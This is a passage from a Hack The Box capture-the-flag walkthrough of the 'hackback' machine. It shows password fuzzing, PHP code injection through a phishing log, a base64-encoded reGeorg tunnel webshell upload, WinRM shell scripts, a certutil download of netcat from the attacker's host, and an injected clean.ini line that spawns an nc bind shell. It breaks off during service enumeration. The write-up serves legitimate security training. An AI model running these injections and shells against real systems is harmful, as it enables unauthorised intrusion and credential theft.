* Wfuzz 2.3.4 - The Web Fuzzer                         *
*****

Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=FUZZ&session=
Total requests: 10000

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=302      0 L        3 W           17 Ch        "123456"
000004:  C=302      0 L        3 W           17 Ch        "password"
000006:  C=302      0 L        3 W           17 Ch        "abc123"
000005:  C=302      0 L        3 W           17 Ch        "qwerty"
000007:  C=302      7 L       15 W          197 Ch        "12345678"
000008:  C=302      0 L        3 W           17 Ch        "password1"
000009:  C=302      0 L        3 W           17 Ch        "1234567"
000010:  C=302      0 L        3 W           17 Ch        "123123"
000002:  C=302      0 L        3 W           17 Ch        "123456789"
000003:  C=302      0 L        3 W           17 Ch        "111111"
000011:  C=302      0 L        3 W           17 Ch        "1234567890"
000012:  C=302      0 L        3 W           17 Ch        "000000"
000013:  C=302      0 L        3 W           17 Ch        "12345"
^C
Finishing pending requests...
```
#### `12345678` gave a different response length so it's probably the password :
```
root@kali:~/Desktop/HTB/boxes/hackback# curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=12345678&session='
Array
(
    [0] => .
    [1] => ..
    [2] => 7cb114055494cb503306a0edd1ad1d398f6fb18e28a7a62883c24fd8ab34f66b.log
    [3] => e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
)
```
#### Yes it worked. I added my `PHPSESSID` cookie with the `-b` option and I also added it to `&session=`, because some stuff didn't work without including the session cookie.
#### `list` showed us some logs. I tried the other actions, `exec` said `Missing command` but I couldn't make it execute anything. `init` didn't output anything but most likely it's doing something that doesn't produce an output. Also `show` didn't result in any output but we will make it do soon.
<br>
<hr>
### Gophish
#### Let's take a look at the full `nmap` scan :
`nmap -T5 -p- hackback.htb --max-retries 1 `
![](/images/hackthebox/hackback/10.png)
#### There's another 3rd port : `64831`. I scanned that port with `nmap` :
`nmap -sV -sT -sC -p 64831 hackback.htb`
![](/images/hackthebox/hackback/11.png)
#### It's `https`. I went there and it was `gophish` :
![](/images/hackthebox/hackback/12.png)
> Gophish is a powerful, open-source phishing framework that makes it easy to test your organization's exposure to phishing. -[getgophish.com](https://getgophish.com/)



#### I tried to login with the default credentials : `admin : gophish` and it worked :
![](/images/hackthebox/hackback/13.png)
#### It was kinda empty but I found some email templates for Facebook, HackTheBox, PayPal and Twitter.
![](/images/hackthebox/hackback/14.png)
#### So there are phishing sites somewhere for these sites and now we can understand what's happening in the secret path. It's an endpoint that shows the collected data from the phishing sites. I created a small list to search for HackTheBox phishing site :
```
hackthebox
hacktheboxeu
hackthebox.eu
htb
www.hackthebox
www.hacktheboxeu
www.hackthebox.eu
www.htb
```
#### Then I used `wfuzz` :
```
root@kali:~/Desktop/HTB/boxes/hackback# wfuzz -c -w list.txt -H "HOST: FUZZ.htb" http://10.10.10.128

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

*****
* Wfuzz 2.3.4 - The Web Fuzzer                         *
*****

Target: http://10.10.10.128/
Total requests: 9

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000001:  C=200     33 L       54 W          614 Ch        "hackthebox"
000005:  C=200    102 L      345 W         4110 Ch        "www.hackthebox"
000008:  C=200     33 L       54 W          614 Ch        "www.htb"
000009:  C=400      6 L       26 W          334 Ch        ""
000006:  C=200     33 L       54 W          614 Ch        "www.hacktheboxeu"
000007:  C=200     33 L       54 W          614 Ch        "www.hackthebox.eu"
000002:  C=200     33 L       54 W          614 Ch        "hacktheboxeu"
000003:  C=200     33 L       54 W          614 Ch        "hackthebox.eu"
000004:  C=200     33 L       54 W          614 Ch        "htb"

Total time: 0.492524
Processed Requests: 9
Filtered Requests: 0
Requests/sec.: 18.27319
```
#### `www.hackthebox` gave a different response length so it's the right one. I added it to `/etc/hosts` :
![](/images/hackthebox/hackback/15.png)
`http://www.hackthebox.htb` :
![](/images/hackthebox/hackback/16.png)
#### Just a fake Hack The Box login page. I entered test credentials :
![](/images/hackthebox/hackback/17.png)
#### Then I checked the secret path again and did `list` :
![](/images/hackthebox/hackback/18.png)
#### The logs increased by one. I did `show` and found the credentials I just sent :
```
root@kali:~/Desktop/HTB/boxes/hackback# curl -b "PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'                                                                                                        
[05 July 2019, 04:49:52 PM] 10.10.xx.xx - Username: test, Password: test
```
<br>
<hr>
### PHP Code Injection, Uploading Tunnel 
#### With a functionality like this, there might be some injection somewhere. After some attempts I tried `php` code and it was executed :
![](/images/hackthebox/hackback/19.png)
```
root@kali:~/Desktop/HTB/boxes/hackback# curl -b "PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'
[05 July 2019, 04:49:52 PM] 10.10.xx.xx - Username: test, Password: test
[05 July 2019, 05:00:20 PM] 10.10.xx.xx - Username: , Password: whatever
```
#### The `username` is empty instead of printing the text I have sent, which means that it got executed as `php`. However all the functions we would use to get `RCE` like `exec` and `system` are disabled so ... no we won't have a shell now. 
#### I wanted to list the files in the current directory so I used the `scandir()` function :
`<?php print_r(scandir('.')); ?>`
![](/images/hackthebox/hackback/20.png)
```
root@kali:~/Desktop/HTB/boxes/hackback# curl -b "PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'
[05 July 2019, 05:06:37 PM] 10.10.xx.xx - Username: Array
(
    [0] => .
    [1] => ..
    [2] => index.html
    [3] => webadmin.php
)
, Password: whatever
```
#### I went up one directory :
`<?php print_r(scandir('..')); ?>`
![](/images/hackthebox/hackback/21.png)
```
    [0] => .
    [1] => ..
    [2] => 2bb6916122f1da34dcd916421e531578
    [3] => App_Data
    [4] => aspnet_client
    [5] => css
    [6] => img
    [7] => index.php
    [8] => js
    [9] => logs
    [10] => web.config
    [11] => web.config.old
```
#### `web.config` and `web.config.old` look interesting. I checked them and in `web.config.old` I found some credentials. I used the `file_get_contents()` function :
`<?php echo file_get_contents('../web.config.old'); ?>`
![](/images/hackthebox/hackback/22.png)
#### `web.config.old` :
```
<configuration>
    <system.webServer>
        <authentication mode="Windows">
        <identity impersonate="true"                 
            userName="simple" 
            password="ZonoProprioZomaro:-("/>
     </authentication>
        <directoryBrowse enabled="false" showFlags="None" />
    </system.webServer>
</configuration>
```
#### Credentials : `simple : ZonoProprioZomaro:-(`. However there's no place to use these credentials. I went back to the `http` port 6666 and I executed `netstat`. I found that `winrm` was running internally :
```
        "CimInstanceProperties":  [
                                      "Caption",
                                      "Description",
                                      "ElementName",
                                      "InstanceID = \"::1??49852??::1??5985\"",
                                      "CommunicationStatus",
                                      "DetailedStatus",
                                      "HealthState",
                                      "InstallDate",
                                      "Name",
                                      "OperatingStatus",
                                      "OperationalStatus",
                                      "PrimaryStatus",
                                      "Status",
                                      "StatusDescriptions",
                                      "AvailableRequestedStates",
                                      "EnabledDefault = 2",
                                      "EnabledState",
                                      "OtherEnabledState",
                                      "RequestedState = 5",
                                      "TimeOfLastStateChange",
                                      "TransitioningToState = 12",
                                      "AggregationBehavior",
                                      "Directionality",
                                      "CreationTime = 12/31/1600 4:00:00 PM",
                                      "LocalAddress = \"::1\"",
                                      "LocalPort = 49852",
                                      "OwningProcess = 0",
                                      "AppliedSetting = 6",
                                      "OffloadState = 0",
                                      "RemoteAddress = \"::1\"",
                                      "RemotePort = 5985",
                                      "State = 11"
                                  ],	
```
#### So somehow we need a proxy to run internally and make us able to connect to `winrm`. Luckily there's [`reGeorgSocksProxy`](https://github.com/sensepost/reGeorg).
#### I downloaded `tunnel.aspx`, converted it to `base-64` then I uploaded it using `file_put_contents()` and `base64_decode()` :
```
<?php file_put_contents("tunnel.aspx",base64_decode("PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVTZXNzaW9uU3RhdGU9IlRydWUiJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5OZXQiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0LlNvY2tldHMiICU+CjwlCi8qICAgICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgX19fX18gICBfX19fX18gIF9ffF9fXyAgfF9fICBfX19fX18gIF9fX19fICBfX19fXyAgIF9fX19fXyAgCiB8ICAgICB8IHwgICBfX198fCAgIF9fX3wgICAgfHwgICBfX198LyAgICAgXHwgICAgIHwgfCAgIF9fX3wgCiB8ICAgICBcIHwgICBfX198fCAgIHwgIHwgICAgfHwgICBfX198fCAgICAgfHwgICAgIFwgfCAgIHwgIHwgCiB8X198XF9fXHxfX19fX198fF9fX19fX3wgIF9ffHxfX19fX198XF9fX19fL3xfX3xcX19cfF9fX19fX3wgCiAgICAgICAgICAgICAgICAgICAgfF9fX19ffAogICAgICAgICAgICAgICAgICAgIC4uLiBldmVyeSBvZmZpY2UgbmVlZHMgYSB0b29sIGxpa2UgR2VvcmcKICAgICAgICAgICAgICAgICAgICAKICB3aWxsZW1Ac2Vuc2Vwb3N0LmNvbSAvIEBfd19tX18KICBzYW1Ac2Vuc2Vwb3N0LmNvbSAvIEB0cm93YWx0cwogIGV0aWVubmVAc2Vuc2Vwb3N0LmNvbSAvIEBrYW1wX3N0YWFsZHJhYWQKCkxlZ2FsIERpc2NsYWltZXIKVXNhZ2Ugb2YgcmVHZW9yZyBmb3IgYXR0YWNraW5nIG5ldHdvcmtzIHdpdGhvdXQgY29uc2VudApjYW4gYmUgY29uc2lkZXJlZCBhcyBpbGxlZ2FsIGFjdGl2aXR5LiBUaGUgYXV0aG9ycyBvZgpyZUdlb3JnIGFzc3VtZSBubyBsaWFiaWxpdHkgb3IgcmVzcG9uc2liaWxpdHkgZm9yIGFueQptaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0uCgpJZiB5b3UgZmluZCByZUdlb3JnZSBvbiBvbmUgb2YgeW91ciBzZXJ2ZXJzIHlvdSBzaG91bGQKY29uc2lkZXIgdGhlIHNlcnZlciBjb21wcm9taXNlZCBhbmQgbGlrZWx5IGZ1cnRoZXIgY29tcHJvbWlzZQp0byBleGlzdCB3aXRoaW4geW91ciBpbnRlcm5hbCBuZXR3b3JrLgoKRm9yIG1vcmUgaW5mb3JtYXRpb24sIHNlZToKaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3JnCiovCiAgICB0cnkKICAgIHsKICAgICAgICBpZiAoUmVxdWVzdC5IdHRwTWV0aG9kID09ICJQT1NUIikKICAgICAgICB7CiAgICAgICAgICAgIC8vU3RyaW5nIGNtZCA9IFJlcXVlc3QuSGVhZGVycy5HZXQoIlgtQ01EIik7CiAgICAgICAgICAgIFN0cmluZyBjbWQgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nLkdldCgiY21kIikuVG9VcHBlcigpOwogICAgICAgICAgICBpZiAoY21kID09ICJDT05ORUNUIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJ0YXJnZXQiKS5Ub1VwcGVyKCk7CiAgICAgICAgICAgICAgICAgICAgLy9SZXF1ZXN0LkhlYWRlcnMuR2V0KCJYLVRBUkdFVCIpOwogICAgICAgICAgICAgICAgICAgIGludCBwb3J0ID0gaW50LlBhcnNlKFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJwb3J0IikpOwogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1QT1JUIikpOwogICAgICAgICAgICAgICAgICAgIElQQWRkcmVzcyBpcCA9IElQQWRkcmVzcy5QYXJzZSh0YXJnZXQpOwogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5OZXQuSVBFbmRQb2ludCByZW1vdGVFUCA9IG5ldyBJUEVuZFBvaW50KGlwLCBwb3J0KTsKICAgICAgICAgICAgICAgICAgICBTb2NrZXQgc2VuZGVyID0gbmV3IFNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5UY3ApOwogICAgICAgICAgICAgICAgICAgIHNlbmRlci5Db25uZWN0KHJlbW90ZUVQKTsKICAgICAgICAgICAgICAgICAgICBzZW5kZXIuQmxvY2tpbmcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBTZXNzaW9uLkFkZCgic29ja2V0Iiwgc2VuZGVyKTsKICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiRElTQ09OTkVDVCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgICAgIHMuQ2xvc2UoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCl7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgU2Vzc2lvbi5BYmFuZG9uKCk7CiAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAoY21kID09ICJGT1JXQVJEIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaW50IGJ1ZmZMZW4gPSBSZXF1ZXN0LkNvbnRlbnRMZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtidWZmTGVuXTsKICAgICAgICAgICAgICAgICAgICBpbnQgYyA9IDA7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gUmVxdWVzdC5JbnB1dFN0cmVhbS5SZWFkKGJ1ZmYsIDAsIGJ1ZmYuTGVuZ3RoKSkgPiAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgcy5TZW5kKGJ1ZmYpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiUkVBRCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGludCBjID0gMDsKICAgICAgICAgICAgICAgICAgICBieXRlW10gcmVhZEJ1ZmYgPSBuZXcgYnl0ZVs1MTJdOwogICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gcy5SZWNlaXZlKHJlYWRCdWZmKSkgPiAwKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gbmV3QnVmZiA9IG5ldyBieXRlW2NdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9BcnJheS5Db25zdHJhaW5lZENvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLkJ1ZmZlci5CbG9ja0NvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQmluYXJ5V3JpdGUobmV3QnVmZik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNhdGNoIChTb2NrZXRFeGNlcHRpb24gc29leCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXgpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUmVzcG9uc2UuV3JpdGUoIkdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZSciKTsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4S2FrKQogICAgewogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4S2FrLk1lc3NhZ2UpOwogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgfQolPgoK")); ?>
```
![](/images/hackthebox/hackback/23.png)
#### Then I checked the tunnel :
![](/images/hackthebox/hackback/24.png)
#### Great !
<hr>
### Running the Proxy Server, Shell as simple
#### First thing to do is to configure `proxychains` to use whatever port we like, I used 8888 :
`/etc/proxychains.conf` :
![](/images/hackthebox/hackback/25.png)
#### Then I used `reGeorgSocksProxy.py` and gave it the port and the path :
`python reGeorgSocksProxy.py -p 8888 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx `
![](/images/hackthebox/hackback/26.png)
#### Now we can connect as `simple`. I used Alamot's winrm ruby shell :
```
#!/usr/bin/ruby
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new( 
  endpoint: 'http://10.10.10.128:5985/wsman',
  transport: :ssl,
  user: 'simple',
  password: 'ZonoProprioZomaro:-(',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = STDIN.gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```
![](/images/hackthebox/hackback/27.png)
#### And .... no flag !
<br>
<hr>
### clean.ini , Shell as hacker
#### I checked `c:\` and found a strange directory called `util` :
![](/images/hackthebox/hackback/28.png)
#### `c:\util`:
```
PS hackback\simple@HACKBACK C:\> cd util                              
PS hackback\simple@HACKBACK util> ls

Directory: C:\util
    
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/14/2018   3:30 PM                PingCastle

-a----         3/8/2007  12:12 AM         139264 Fping.exe

-a----        3/29/2017   7:46 AM         312832 kirbikator.exe

-a----       12/14/2018   3:42 PM           1404 ms.hta

-a----        2/29/2016  12:04 PM         359336 PSCP.EXE

-a----        2/29/2016  12:04 PM         367528 PSFTP.EXE

-a----         5/4/2018  12:21 PM          23552 RawCap.exe
```
#### However there was a hidden directory, if we do `dir -force` :
```
PS hackback\simple@HACKBACK util> dir -force

Directory: C:\util

Mode                LastWriteTime         Length Name
----                -------------         ------ ----                                     
d-----       12/14/2018   3:30 PM                PingCastle

d--h--       12/21/2018   6:21 AM                scripts

-a----         3/8/2007  12:12 AM         139264 Fping.exe

-a----        3/29/2017   7:46 AM         312832 kirbikator.exe

-a----       12/14/2018   3:42 PM           1404 ms.hta

-a----        2/29/2016  12:04 PM         359336 PSCP.EXE

-a----        2/29/2016  12:04 PM         367528 PSFTP.EXE

-a----         5/4/2018  12:21 PM          23552 RawCap.exe
```
#### A new directory appeared : `scripts`. looking in that directory :
```
PS hackback\simple@HACKBACK util> cd scripts
|S-chain|-<>-127.0.0.1:8888-<><>-10.10.10.128:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8888-<><>-10.10.10.128:5985-<><>-OK
Could not find item C:\util\scripts.
At line:1 char:56
+ ... join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name), ...
+                                                           ~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\util\scripts:String) [Get-Item], IOException
    + FullyQualifiedErrorId : ItemNotFound,Microsoft.PowerShell.Commands.GetItemCommand
PS hackback\simple@HACKBACK > ls

    Directory: C:\util\scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/13/2018   2:54 PM            spool
-a----       12/21/2018   5:44 AM         84 backup.bat
-a----         7/5/2019   5:34 PM         39 batch.log
-a----         7/5/2019   6:07 PM        135 clean.ini
-a----        12/8/2018   9:17 AM       1232 dellog.ps1
-a----         7/5/2019   5:34 PM         36 log.txt
```
#### Without talking too much about the rabbit holes and the failed attempts. If we check `clean.ini` :
```
PS hackback\simple@HACKBACK > type clean.ini
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt
Directory=c:\inetpub\logs\logfiles
```
#### Obviously it gets executed from time to time, and it's the only writable thing by `simple` in that directory. We can inject commands in `LogFile` which means that we can make another user execute our commands. I tried to upload `nc.exe` but :
```
PS hackback\simple@HACKBACK > certutil -urlcache -split -f http://10.10.xx.xx/nc64.exe C:\windows\system32\spool\drivers\color\nc.exe
|S-chain|-<>-127.0.0.1:8888-<><>-10.10.10.128:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8888-<><>-10.10.10.128:5985-<><>-OK
At line:1 char:1
+ certutil -urlcache -split -f http://10.10.xx.xx/nc64.exe C:\windows\s ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```
#### Expected. I terminated that `winrm` session and used Alamot's other `winrm` shell that had upload and download capabilities :
```
#!/usr/bin/ruby

require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt

conn = WinRM::Connection.new( 
  endpoint: 'http://10.10.10.128:5985/wsman',
  user: 'simple',
  password: 'ZonoProprioZomaro:-(',
)

file_manager = WinRM::FS::FileManager.new(conn) 


class String
  def tokenize
    self.
      split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
      select {|s| not s.empty? }.
      map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
  end
end


command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = STDIN.gets
        if command.start_with?('UPLOAD') then
            upload_command = command.tokenize
            print("Uploading " + upload_command[1] + " to " + upload_command[2])
            file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
                puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
            end
            command = "echo `nOK`n"
        end
        if command.start_with?('DOWNLOAD') then
            download_command = command.tokenize
            print("Downloading " + download_command[1] + " to " + download_command[2])
            file_manager.download(download_command[1], download_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
                puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
            end
            command = "echo `nOK`n"
        end

        output = shell.run(command) do |stdout, stderr|
            STDOUT.print(stdout)
            STDERR.print(stderr)
        end
    end    
    puts("Exiting with code #{output.exitcode}")
end
```
#### Then I uploaded `nc.exe` to `C:\windows\system32\spool\drivers\color\` (to bypass applocker) :
```
root@kali:~/Desktop/HTB/boxes/hackback# proxychains ./winrm2.rb 
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8888-<><>-10.10.10.128:5985-<><>-OK
PS hackback\simple@HACKBACK Documents> UPLOAD /root/Desktop/HTB/boxes/hackback/nc.exe C:\windows\system32\spool\drivers\color\nc.exe
Uploading /root/Desktop/HTB/boxes/hackback/nc.exe to C:\windows\system32\spool\drivers\color\nc.exe|S-chain|-<>-127.0.0.1:8888-<><>-10.10.10.128:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8888-<><>-10.10.10.128:5985-<><>-OK
26892 bytes of 51488 bytes copied
51488 bytes of 51488 bytes copied

OK
PS hackback\simple@HACKBACK Documents>
```
#### After that I used simple echo commands to edit `clean.ini`. It should look like this :
```
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt & cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe
Directory=c:\inetpub\logs\logfiles
```
#### This way we can get a bind shell. 
```
PS C:\util\scripts> echo [Main] > C:\util\scripts\clean.ini
echo [Main] > C:\util\scripts\clean.ini
PS C:\util\scripts> echo LifeTime=100 >> C:\util\scripts\clean.ini
echo LifeTime=100 >> C:\util\scripts\clean.ini
PS C:\util\scripts> echo "LogFile=c:\util\scripts\log.txt & cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe" >> C:\util\scripts\clean.ini                                          
echo "LogFile=c:\util\scripts\log.txt & cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe" >> C:\util\scripts\clean.ini                                                              
PS C:\util\scripts> echo "Directory=c:\inetpub\logs\logfiles" >> C:\util\scripts\clean.ini
echo "Directory=c:\inetpub\logs\logfiles" >> C:\util\scripts\clean.ini
PS C:\util\scripts> cat clean.ini
cat clean.ini
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt & cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe                       Directory=c:\inetpub\logs\logfiles
PS C:\util\scripts>
```
#### After some time the listener starts and we can connect to port 1338 through the proxy :
![](/images/hackthebox/hackback/29.png)
#### Finally we owned user !
<br>
<hr>
### UserLogger, Filesystem Access as System, Root Flag
#### After getting a shell as `hacker` I did my regular Windows enumeration, one thing I wanted to check was the services, I remembered the services list I got from port 6666 so I checked that. 
#### I noticed  a strange service called `UserLogger` :
```
        "name":  "UserLogger",
        "startname":  "LocalSystem",
        "displayname":  "User Logger",
        "status":  "OK"
```
#### So I checked the entry of that service in registry :
```
C:\>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    c:\windows\system32\UserLogger.exe
    ObjectName    REG_SZ    LocalSystem
    DisplayName    REG_SZ    User Logger
    Description    REG_SZ    This service is responsible for logging user activity

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger\Security

```
